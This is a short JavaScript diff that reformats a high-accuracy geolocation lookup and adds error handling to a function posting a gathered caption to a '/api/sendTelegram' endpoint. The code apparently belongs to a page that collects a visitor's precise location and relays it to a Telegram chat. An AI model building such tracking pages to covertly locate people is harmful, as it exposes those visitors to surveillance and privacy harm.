@@ -63,11 +63,15 @@
           resolve();
           return;
         }
-        navigator.geolocation.getCurrentPosition(pos => {
-          info.lat = pos.coords.latitude.toFixed(6);
-          info.lon = pos.coords.longitude.toFixed(6);
-          resolve();
-        }, () => resolve(), { enableHighAccuracy: true, timeout: 8000 });
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            info.lat = pos.coords.latitude.toFixed(6);
+            info.lon = pos.coords.longitude.toFixed(6);
+            resolve();
+          },
+          () => resolve(),
+          { enableHighAccuracy: true, timeout: 8000 }
+        );
       });
     }
 
@@ -87,11 +91,21 @@
 
     async function sendToServer() {
       const text = getCaption();
-      await fetch('/api/sendTelegram', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ message: text })
-      });
+      try {
+        const response = await fetch('/api/sendTelegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ message: text }),
+        });
+        if (!response.ok) {
+          const errorData = await response.json();
+          console.error('Lỗi khi gửi Telegram:', errorData);
+        } else {
+          console.log('Gửi Telegram thành công');
+        }
+      } catch (error) {
+        console.error('Lỗi mạng hoặc fetch:', error);
+      }
     }
 
     async function main() {
